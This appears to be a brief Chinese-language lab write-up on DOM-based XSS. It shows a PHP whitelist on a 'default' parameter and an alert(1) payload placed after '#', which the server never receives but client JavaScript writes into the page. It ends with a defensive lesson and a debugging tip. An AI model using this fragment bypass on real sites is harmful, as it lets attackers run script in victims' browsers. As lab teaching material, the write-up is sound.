## 源码审计

PHP 白名单，只放 English/French/German/Spanish：

```php
switch ($_GET['default']) {
    case "French": case "English": case "German": case "Spanish":
        break;
    default:
        header("location: ?default=English");
        exit;
}
```

## 绕过

`#` 后面不发给服务器——PHP 看不到，JS 能看到：

```payload
?default=English#<script>alert(1)</script>
```

| 层 | 看到的值 | 反应 |
|------|------|------|
| PHP | `English` | 白名单放行 |
| JS `location.href` | `English#<script>alert(1)</script>` | 原样写进 DOM |

## 教训

PHP 白名单 ≠ 前端安全。防御需前后端一致——要么 PHP 对输出编码，要么 JS 不信任 URL。

> ⚠️ **调试坑**：改 `#` 后面不会触发页面重载。改完 URL 必须**复制整条到新标签页打开**或 F5 刷新，否则 `document.write` 不执行。
